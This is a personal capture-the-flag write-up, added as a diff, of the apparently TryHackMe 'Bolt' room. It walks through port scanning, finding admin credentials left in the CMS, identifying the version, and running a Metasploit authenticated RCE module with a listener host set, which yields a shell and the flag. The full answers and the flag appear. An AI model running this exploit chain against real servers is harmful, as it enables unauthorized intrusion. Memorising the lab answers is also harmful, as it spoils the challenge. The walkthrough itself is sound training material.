@@ -1,0 +1,172 @@
+BOLT.
+
+
+
+
+[>>> TASK 1: DEPLOY THE MACHINE]
+Nothing to do here.
+
+
+
+
+[>>> TASK 2: HACK YOUR WAY INTO THE MACHINE!]
+[2.1. WHAT PORT NUMBER HAS A WEB SERVER WITH A CMS RUNNING?]
+[ACTION: quick nmap all ports scan]
+nmap -sS -T4 -sV -p- 10.10.252.150
+[OUTPUT]
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 10:14 CEST
+Nmap scan report for 10.10.252.150
+Host is up (0.047s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+8000/tcp open  http    (PHP 7.2.32-1)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8000-TCP:V=7.95%I=7%D=7/27%Time=6885E016%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,28F5,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2027\x20Jul\x20
+...
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+[ACTION: explore http://10.10.252.150/]
+Landing site is the apache2 ubuntu default page.
+
+
+[ACTION: explore http://10.10.252.150:8000/]
+Landing site is bolt related.
+[ANSWER]
+8000
+
+
+
+[2.2. WHAT IS THE USERNAME WE CAN FIND IN THE CMS?]
+[ACTION: explore http://10.10.252.150:8000/]
+[OUTPUT]
+Hello Everyone,
+
+Welcome to this site, myself Jake and my username is bolt .I am still new to this CMS so it can take awhile for me to get used to this CMS but believe me i have some great content coming up for you all!
+
+Regards,
+
+Jake (Admin)
+[ANSWER]
+bolt
+
+
+
+[2.3. WHAT IS THE PASSWORD WE CAN FIND FOR THE USERNAME?]
+[NOTE]
+Both jake and the user show they are new to bolt cms, so we research and find the default login portal is ip/bolt. After testing it out, jake has kept it that way.
+Using web inspector (ctrl + i) we find login form payload values:
+user_login[username] test
+user_login[password] test
+user_login[login] 
+user_login[_token] GL18EX9sdCtlv35VdLQ1cE2ccxh_Sj81p0MNZlXL3WU
+Luckily, the token value stays the same even after trying different passwords and users, so I can keep my initial plan to run hydra.
+However, after doing more exploring on the site, I found: 
+"Message for IT Department
+Hey guys,
+
+i suppose this is our secret forum right? I posted my first message for our readers today but there seems to be a lot of freespace out there. Please check it out! my password is boltadmin123 just incase you need it!
+
+Regards,
+
+Jake (Admin)"
+So we won't need to bruteforce.
+[ANSWER]
+boltadmin123
+
+
+
+[1.4. WHAT VERSION OF THE CMS IS INSTALLED ON THE SERVER? (EX: NAME 1.1.1)]
+[NOTE]
+I didn't find te cms version doing a manual research, so I will try some tools.
+[ACTION: run whatweb]
+whatweb http://10.10.252.150:8000/
+[OUTPUT]
+http://10.10.252.150:8000/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.252.150], MetaGenerator[Bolt], PHP[7.2.32-1+ubuntu18.04.1+deb.sury.org+1], Script, Title[Bolt | A hero is unleashed], UncommonHeaders[x-debug-token], X-Powered-By[PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1]
+[NOTE]
+Not useful.
+
+
+[NOTE]
+Stupidly, I forgot I have the admin creds...
+Creds: bolt|boltadmin123
+[ACTION: log in as admin to portal http://10.10.252.150:8000/bolt/login]
+
+
+[ACTION: find bolt cms version]
+Click view site.
+[OUTPUT (bottom left)]
+Bolt 3.7.1
+[ANSWER]
+3.7.1
+
+
+
+[1.5. THERE'S AN EXPLOIT FOR A PREVIOUS VERSION OF THIS CMS, WHICH ALLOWS AUTHENTICATED RCE. FIND IT ON EXPLOITDB. WHAT'S ITS EDB-ID?]
+[ACTION: look for bolt rce exploits on exploitdb]
+-------------------------------------- ---------------------------------
+ Exploit Title                        |  Path
+-------------------------------------- ---------------------------------
+Bolt CMS 3.6.6 - Cross-Site Request F | php/webapps/46664.html
+Bolt CMS 3.7.0 - Authenticated Remote | php/webapps/48296.py
+-------------------------------------- ---------------------------------
+[NOTE]
+The 3.6.6 one also allows csrf, but since we are looking for just rce, the other one is more likely to be the answer.
+Bolt CMS 3.7.0 - Authenticated Remote Code Execution: https://www.exploit-db.com/exploits/48296
+[ANSWER]
+48296
+
+
+
+[1.6. METASPLOIT RECENTLY ADDED AN EXPLOIT MODULE FOR THIS VULNERABILITY. WHAT'S THE FULL PATH FOR THIS EXPLOIT? (EX: exploit/...)]
+[ACTION: look for exploit on metasploit]
+msfconsole
+search bolt rce
+[OUTPUT]
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank   Check  Description
+   -  ----                                        ---------------  ----   -----  -----------
+   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       great  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
+   1    \_ target: Linux (x86)                    .                .      .      .
+   2    \_ target: Linux (x64)                    .                .      .      .
+   3    \_ target: Linux (cmd)                    .                .      .      .
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/unix/webapp/bolt_authenticated_rce
+After interacting with a module you can manually set a TARGET with set TARGET 'Linux (cmd) 
+[ANSWER]
+exploit/unix/webapp/bolt_authenticated_rce
+
+
+
+[1.7. SET THE LHOST, LPORT, RHOST, USERNAME, PASSWORD IN MSFCONSOLE BEFORE RUNNING THE EXPLOIT]
+[ACTION: set requested parameters]
+set LHOST 10.23.25.109
+set RHOSTS 10.10.252.150
+set RPORT 8000
+
+
+[ACTION: set missing (and necessary) parameters]
+set USERNAME bolt
+set PASSWORD boltadmin123
+
+
+[ACTION: run exploit]
+exploit
+
+
+[ACTION: find flag flag.txt]
+find / -name "flag.txt" 2>/dev/null
+[OUTPUT]
+/home/flag.txt
+
+
+[ACTION: check flag]
+cat /home/flag.txt
+[OUTPUT]
+THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
